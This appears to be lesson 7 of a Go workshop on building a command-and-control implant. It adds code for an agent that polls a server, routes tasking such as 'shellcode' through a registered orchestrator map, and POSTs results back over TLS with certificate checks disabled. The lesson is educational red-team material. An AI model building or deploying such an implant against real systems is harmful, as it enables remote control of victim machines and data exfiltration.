---
layout: workshop03
title: "Lesson 7: Create Agent Command Execution Framework"
---

## Solutions

The starting solution can be found here.

The final solution can be found here.


## Overview

The agent now receives commands from the server, but it doesn't know what to do with them. We need to build a framework for executing commands on the agent side.

In this lesson, we'll create the architecture for command execution:

1. Understand the execution flow (RunLoop → ExecuteTask → Orchestrator → Doer)
2. Create the `ExecuteTask` function (command router)
3. Create a system for registering commands with their orchestrators
4. Set up the infrastructure for command-specific orchestration

This lesson establishes the **pattern** we'll use for all commands. We won't implement the actual shellcode execution yet - that comes in the next lessons.

## What We'll Create

- `OrchestratorFunc` type in `agent/commands.go`
- `AgentTaskResult` type in `models/types.go`
- `ExecuteTask()` method in `agent/commands.go`
- Command registration system
- Updated agent struct with command orchestrators map
- Updated constructor to initialize and register commands

## Understanding the Execution Flow

Before we write code, let's understand how command execution will flow through the agent:

```
┌─────────────────────────────────────────────────────────────────┐
│ AGENT COMMAND EXECUTION FLOW                                    │
└─────────────────────────────────────────────────────────────────┘

1. RunLoop (agent/runloop.go)
   ├─ Receives ServerResponse from server
   ├─ Detects response.Job == true
   └─ Calls agent.ExecuteTask(response)

2. ExecuteTask (agent/commands.go)
   ├─ Command Router - maps command keyword to orchestrator
   ├─ Looks up: commandOrchestrators["shellcode"]
   └─ Calls: orchestrateShellcode(agent, response)

3. Orchestrator (agent/orchestrator.go)
   ├─ Unpacks ServerResponse
   ├─ Validates arguments (agent-side validation)
   ├─ Prepares arguments for Doer
   └─ Calls: DoShellcode(rawBytes, exportName)

4. Doer (shellcode/doer_shellcode_*.go)
   ├─ OS-specific implementation (Windows/Mac/Linux)
   ├─ Performs actual action (loads DLL, executes shellcode)
   └─ Returns: ShellcodeResult

5. Back up the chain:
   ├─ Orchestrator: Wraps result in AgentTaskResult
   ├─ ExecuteTask: Marshals result and sends to server
   └─ RunLoop: Continues periodic check-ins
```

**Why this architecture?**

- **RunLoop** handles communication timing - it shouldn't know about command specifics
- **ExecuteTask** routes commands - it's a dispatcher, not an executor
- **Orchestrator** handles command-specific logic and argument preparation
- **Doer** performs the actual work and can have OS-specific implementations

This separation of concerns makes the code modular, testable, and extensible.

## Create AgentTaskResult Type

When the agent finishes executing a command, it needs to report results back to the server. Let's create a type for this in `models/types.go`:

```go
// AgentTaskResult represents the result of command execution sent back to server
type AgentTaskResult struct {
	JobID         string          `json:"job_id"`
	Success       bool            `json:"success"`
	CommandResult json.RawMessage `json:"command_result,omitempty"`
	Error         error           `json:"error,omitempty"`
}
```




**Understanding the fields:**

1. **JobID** - The same job ID the server sent
    - Allows the server to correlate results with the command that was dispatched
    - Critical for tracking in multi-command scenarios
2. **Success** - Boolean indicating if the command succeeded
    - `true` = Command executed successfully
    - `false` = Command failed
3. **CommandResult** - Command-specific results as raw JSON
    - Different commands have different outputs
    - Shellcode might return a success message
    - Download might return file metadata
    - Shell command might return stdout/stderr
    - Using `json.RawMessage` allows flexibility
4. **Error** - Error message if the command failed
    - Only populated when `Success` is `false`
    - Contains details about what went wrong

## Understanding Method Expressions in Go

Before we continue, we need to understand an important Go concept: **method expressions**.

Normally, you call a method on an instance:

```go
agent := NewAgent("localhost:8443")
result := agent.orchestrateShellcode(job)  // Normal method call
```

But Go also allows you to reference methods as functions:

```go
// Method expression - converts method to function
fn := (*Agent).orchestrateShellcode

// Now fn is a function that takes *Agent as first parameter
result := fn(agent, job)
```

**Why is this useful?**

It allows us to store methods in a map:

```go
type OrchestratorFunc func(agent *Agent, job *models.ServerResponse) models.AgentTaskResult

commandOrchestrators := map[string]OrchestratorFunc{
    "shellcode": (*Agent).orchestrateShellcode,  // Method expression
}

// Later, call it like a normal function
orchestrator := commandOrchestrators["shellcode"]
result := orchestrator(agent, job)
```

This is how we'll map command keywords to their orchestrator methods!



## Create OrchestratorFunc Type

Let's define the function signature for all command orchestrators. Create a new file `agent/commands.go` and add the following:

```go
// OrchestratorFunc defines the signature for command orchestrator functions
type OrchestratorFunc func(agent *Agent, job *models.ServerResponse) models.AgentTaskResult
```

**Understanding this signature:**

- **Input 1:** `agent *Agent` - Pointer to the agent instance (method receiver in method expression)
- **Input 2:** `job *models.ServerResponse` - The command from the server
- **Output:** `models.AgentTaskResult` - The execution result

Every orchestrator must follow this pattern, which allows us to store them in a map and call them uniformly.

## Update Agent Struct

The agent needs to store a mapping of command keywords to orchestrator functions. Update the `Agent` struct in `agent/agent.go`:

```go
// Agent implements the Communicator interface for HTTPS
type Agent struct {
	serverAddr           string
	client               *http.Client
	commandOrchestrators map[string]OrchestratorFunc // ADD THIS LINE
}
```

This map stores:

- **Key:** Command keyword (e.g., "shellcode")
- **Value:** Orchestrator function for that command



## Update Agent Constructor

Now we need to initialize this map and register our commands. Update `NewAgent()` in `agent/agent.go`:

```go
// NewAgent creates a new HTTPS agent
func NewAgent(serverAddr string) *Agent {
	// Create TLS config that accepts self-signed certificates
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	// Create HTTP client with custom TLS config
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
	}

	agent := &Agent{
		serverAddr:           serverAddr,
		client:               client,
		commandOrchestrators: make(map[string]OrchestratorFunc), // Initialize the map
	}

	registerCommands(agent) // Register individual commands

	return agent
}
```


Let's look at the new code...


### Initialize the map

```go
commandOrchestrators: make(map[string]OrchestratorFunc)
```

We must use `make()` to create an actual map. An uninitialized map is `nil` and will panic if you try to write to it.


### Register commands

```go
registerCommands(agent)
```

This function will populate the map with our available commands.



## Mini-Lesson: Why does Go require `make()` for maps but not structs?

Since this is a common point of confusion, I want to specifically point it out. The reason relates to Go's "useful zero value" principle - whenever possible, Go will assign a type a valid, usable state. For example if we create a `bool`, we don't actually need to assign it a value if we want it to be false. Why? When we create a bool, it's default value is false.

Similarly for a struct, when we create it, it's zero value is a valid, usable struct with all fields set to their zero values. Meaning we can use it immediately. The same is true for a mutex - we've already seen this multiple times.

```go
var m sync.Mutex  // Zero value = unlocked mutex, ready to use
m.Lock()          // Works!
```



But of course, this is not always the case. With maps, slices, and channels the zero value is `nil`, representing the _absence_ of a data structure. We can't use `nil` because the underlying storage doesn't exist yet, so we have to use `make()` to instantiate it.

```go
var m map[string]int  // Zero value = nil
m["key"] = 1          // Panic! No storage allocated
```

The `make()` function explicitly allocates the underlying data structure, transforming the `nil` reference into a usable map. This design choice forces us to be intentional about allocating dynamic structures while keeping simple types lightweight.



## Create registerCommands Function

Now let's create the function that registers our commands. Add this to `agent/commands.go`:

```go
// registerCommands registers all available command orchestrators
func registerCommands(agent *Agent) {
	agent.commandOrchestrators["shellcode"] = (*Agent).orchestrateShellcode
	// Register other commands here in the future
}
```

**Understanding this code:**

```go
agent.commandOrchestrators["shellcode"] = (*Agent).orchestrateShellcode
```

- **Key:** `"shellcode"` - The command keyword
- **Value:** `(*Agent).orchestrateShellcode` - Method expression referencing the orchestrator method

When we want to add more commands, we simply add more lines:

```go
agent.commandOrchestrators["download"] = (*Agent).orchestrateDownload
agent.commandOrchestrators["upload"] = (*Agent).orchestrateUpload
```

**Note:** `orchestrateShellcode` doesn't exist yet, so this will error. We'll create it in the next lesson. For now, let's comment it out:

```go
func registerCommands(agent *Agent) {
	// agent.commandOrchestrators["shellcode"] = (*Agent).orchestrateShellcode
	// Register other commands here in the future
}
```


## Implement ExecuteTask

Now let's create the command router that will receive commands from RunLoop and dispatch them to the correct orchestrator. Add this to `agent/commands.go`:

```go
// ExecuteTask receives a command from the server and routes it to the appropriate orchestrator
func (agent *Agent) ExecuteTask(job *models.ServerResponse) {
	log.Printf("AGENT IS NOW PROCESSING COMMAND %s with ID %s", job.Command, job.JobID)

	var result models.AgentTaskResult

	// Look up the orchestrator for this command
	orchestrator, found := agent.commandOrchestrators[job.Command]

	if found {
		// Call the orchestrator
		result = orchestrator(agent, job)
	} else {
		// Command not recognized
		log.Printf("|WARN AGENT TASK| Received unknown command: '%s' (ID: %s)", job.Command, job.JobID)
		result = models.AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("command not found"),
		}
	}

	// Marshal the result before sending it back
	resultBytes, err := json.Marshal(result)
	if err != nil {
		log.Printf("|❗ERR AGENT TASK| Failed to marshal result for Task ID %s: %v", job.JobID, err)
		return // Cannot send result if marshalling fails
	}

	// Send the result back to the server
	log.Printf("|AGENT TASK|-> Sending result for Task ID %s (%d bytes)...", job.JobID, len(resultBytes))
	err = agent.SendResult(resultBytes)
	if err != nil {
		log.Printf("|❗ERR AGENT TASK| Failed to send result for Task ID %s: %v", job.JobID, err)
	}

	log.Printf("|AGENT TASK|-> Successfully sent result for Task ID %s.", job.JobID)
}
```


This is quite a lot, but all simple really. Let's break it down bit by bit...


### Log the command

```go
log.Printf("AGENT IS NOW PROCESSING COMMAND %s with ID %s", job.Command, job.JobID)
```

Visibility into what's happening.

### Look up the orchestrator

```go
orchestrator, found := agent.commandOrchestrators[job.Command]
```

Try to find an orchestrator for this command keyword. Returns:
- `orchestrator` - The function (if found)
- `found` - Boolean indicating if it exists

### Call orchestrator if found

```go
if found {
    result = orchestrator(agent, job)
}
```

Call the orchestrator function, passing the agent and job. This returns an `AgentTaskResult`.

### Handle unknown command

```go
    else {
        log.Printf("|WARN AGENT TASK| Received unknown command: '%s' (ID: %s)", job.Command, job.JobID)
        result = models.AgentTaskResult{
            JobID:   job.JobID,
            Success: false,
            Error:   errors.New("command not found"),
        }
    }
```

If the command isn't registered, create a failure result.

### Marshal the result

```go
resultBytes, err := json.Marshal(result)
if err != nil {
    log.Printf("|❗ERR AGENT TASK| Failed to marshal result for Task ID %s: %v", job.JobID, err)
    return
}
```

Convert the result struct to JSON bytes for sending.

### Send result to server

```go
err = agent.SendResult(resultBytes)
```

Call `SendResult()` to POST the results back to the server (we'll implement this next).



## Implement SendResult Method

The agent needs a method to send results back to the server. Add this to `agent/agent.go`:

```go
// SendResult performs a POST request to send task results back to server
func (agent *Agent) SendResult(resultData []byte) error {
	targetURL := fmt.Sprintf("https://%s/results", agent.serverAddr)

	log.Printf("|RETURN RESULTS|-> Sending %d bytes of results via POST to %s", len(resultData), targetURL)

	// Create the HTTP POST request
	req, err := http.NewRequest(http.MethodPost, targetURL, bytes.NewReader(resultData))
	if err != nil {
		log.Printf("|❗ERR SendResult| Failed to create results request: %v", err)
		return fmt.Errorf("failed to create http results request: %w", err)
	}

	// Set the headers
	req.Header.Set("Content-Type", "application/json")

	// Execute the request
	resp, err := agent.client.Do(req)
	if err != nil {
		log.Printf("|❗ERR | Results POST request failed: %v", err)
		return fmt.Errorf("http results post request failed: %w", err)
	}
	defer resp.Body.Close() // Close body even if we don't read it, to release resources

	log.Printf("💥 SUCCESSFULLY SENT FINAL RESULTS BACK TO SERVER.")
	return nil
}
```


This is thus the new method we'll use to send the final result back to the server. Let's break this down...


### Build URL

```go
targetURL := fmt.Sprintf("https://%s/results", agent.serverAddr)
```

POST to `/results` endpoint (which doesn't exist on server yet - we'll create it in a future lesson).


### Create the POST request

```go
req, err := http.NewRequest(http.MethodPost, targetURL, bytes.NewReader(resultData))
```

Create a POST request with the result data as the body.

### Set Content Type

```go
req.Header.Set("Content-Type", "application/json")
```

Tell the server we're sending JSON - not required, but good practice.

### Execute and handle

```go
resp, err := agent.client.Do(req)
```

Send the request using the agent's HTTP client.


Again, just to underline this new method is different from our original `Send()` method, and we need both:

- **Send()** - GET request for check-ins, receives commands
- **SendResult()** - POST request to send command results

## Update RunLoop

Finally, let's wire everything together by calling `ExecuteTask` from the run loop. Update `RunLoop` in `agent/runloop.go`:

```go
func RunLoop(agent *Agent, ctx context.Context, delay time.Duration, jitter int) error {

	for {
		// Check if context is cancelled
		select {
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		default:
		}

		response, err := agent.Send(ctx)
		if err != nil {
			log.Printf("Error sending request: %v", err)
			// Don't exit - just sleep and try again
			time.Sleep(delay)
			continue // Skip to next iteration
		}

		if response.Job {
			log.Printf("Job received from Server\n-> Command: %s\n-> JobID: %s", response.Command, response.JobID)
			agent.ExecuteTask(response)  // NEW: Execute the task
		} else {
			log.Printf("No job from Server")
		}

		// Calculate sleep duration with jitter
		sleepDuration := CalculateSleepDuration(delay, jitter)

		log.Printf("Sleeping for %v", sleepDuration)

		// Sleep with cancellation support
		select {
		case <-time.After(sleepDuration):
			// Continue to next iteration
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		}
	}
}
```


- So we simply added this line - `agent.ExecuteTask(response)`
- Meaning now that when we receive a job, we call `ExecuteTask()` to process it.


## Test (Limited)

Right now we won't be able to test since we have multiple dangling threads of logic, which means our code won't compile/execute.


## Conclusion

In this lesson, we've built the command execution framework:

- Created `OrchestratorFunc` type defining the orchestrator signature
- Created `AgentTaskResult` type for execution results
- Implemented `ExecuteTask()` as the command router
- Created command registration system with method expressions
- Updated agent struct and constructor to support orchestrators
- Implemented `SendResult()` to POST results back to server
- Wired everything together in RunLoop
- Understood method expressions in Go

Our agent can now:

- ✓ Receive commands from the server
- ✓ Route commands to orchestrators (when registered)
- ✓ Handle unknown commands gracefully
- ✓ Marshal and send results back to server

In the next lesson, we'll implement the actual shellcode orchestrator that will prepare arguments and call the OS-specific doer!

---

<div style="display: flex; justify-content: space-between; margin-top: 2rem;">
<div><a href="/courses/workshop03/dequeue">← Previous: Lesson 6 - Dequeue and Send Commands</a></div>
<div><a href="/courses/workshop03">↑ Table of Contents</a></div>
<div><a href="/courses/workshop03/orchestrator">Next: Lesson 8 - Implement Shellcode Orchestrator →</a></div>
</div>
